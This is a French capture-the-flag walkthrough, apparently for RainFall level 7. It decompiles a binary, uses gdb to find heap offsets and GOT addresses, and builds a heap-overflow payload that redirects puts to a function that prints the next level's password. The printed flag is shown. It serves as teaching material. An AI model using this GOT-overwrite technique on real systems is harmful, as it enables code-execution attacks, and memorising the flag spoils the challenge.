# **Level 7**

Pour le `level7` on decompile l'executable

```
void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;
  
  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}

undefined4 main(undefined4 param_1,int param_2)
{
  undefined4 *puVar1;
  void *pvVar2;
  undefined4 *puVar3;
  FILE *__stream;
  
  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;
  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;
  strcpy((char *)puVar1[1],*(char **)(param_2 + 4));
  strcpy((char *)puVar3[1],*(char **)(param_2 + 8));
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,0x44,__stream);
  puts("~~");
  return 0;
}
```

Le but de ce niveau est de remplacer l'appel de `puts` par un appel a `m` via la `Global Offset Table (GOT)`
Pour ce faire, on va overflow avec le premier `strcpy` pour remplacer l'addresse donner par le dernier malloc par l'addresse de `puts` dans lequel on va mettre l'addresse de `m`

Donc la premiere etape est de savoir ou ecrire pour reecrire l'addresse vers laquelle pointe `puVar3[1]`
pour cela on analyse le code et on conclue que l'addresse qu'on veux ecraser c'est l'addresse de `puVar3` + 4 donc on fait la difference `puVar3 - puVar1[1] + 4`

```
(gdb) b *0x08048550
Breakpoint 1 at 0x8048550
(gdb) b *0x08048565
Breakpoint 2 at 0x8048565
(gdb) run aaaaaaaaaaa
Starting program: /home/user/level7/level7 aaaaaaaaaaa

Breakpoint 1, 0x08048550 in main ()
(gdb) x $eax
0x804a018:      0x00000000
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x08048565 in main ()
(gdb) x $eax
0x804a028:      0x00000000
(gdb)
```
> (0x804a028 - 0x804a018) + 4 = 20

Maintenant on a plus qu'a trouver nos addresses

Tout d'abord l'addresse de `puts`

```
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928 <===
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

Puis l'addresse de `m`

```
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>
   0x0804851f <+43>:    leave
   0x08048520 <+44>:    ret
End of assembler dump.
```

Maintenant on a tout, on peux construire notre payload

```
level7@RainFall:~$ ./level7 $(python -c 'print"a"*20+"\x28\x99\x04\x08"') $(python -c 'print"\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1707655140
```

> ### NEXT : [Level 8](/level8/resources/README.md)
